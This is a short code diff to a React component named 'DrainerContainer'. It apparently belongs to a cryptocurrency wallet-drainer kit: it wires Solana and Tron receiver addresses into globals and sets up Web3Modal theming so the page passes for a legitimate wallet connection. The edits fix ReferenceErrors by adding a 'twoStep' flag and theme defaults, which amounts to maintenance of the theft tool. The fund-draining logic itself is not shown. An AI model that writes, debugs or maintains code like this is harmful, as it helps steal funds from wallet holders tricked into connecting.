@@ -20,8 +20,7 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       (window as any).solanaReceiver = receivers.SOLANA;
       (window as any).tronReceiver = receivers.TRON;
 
-      // ==================== ADDED: OVERLAY THEMING UI DEFINITIONS ====================
-      // This ensures that integrated Web3Modal packages do not crash with a ReferenceError
+      // Overlay theming UI definitions to satisfy Web3Modal/WalletConnect package parameters
       if (typeof (window as any).themeVariables === 'undefined') {
         (window as any).themeVariables = {
           '--w3m-accent-color': '#0f172a',
@@ -35,7 +34,11 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       if (typeof (window as any).themeMode === 'undefined') {
         (window as any).themeMode = 'dark';
       }
-      // ==============================================================================
+
+      // FIXED: Added global workflow variable to prevent ReferenceError
+      if (typeof (window as any).twoStep === 'undefined') {
+        (window as any).twoStep = false;
+      }
 
       console.log(`Initializing client-side execution for chain: ${chainId}`);
 
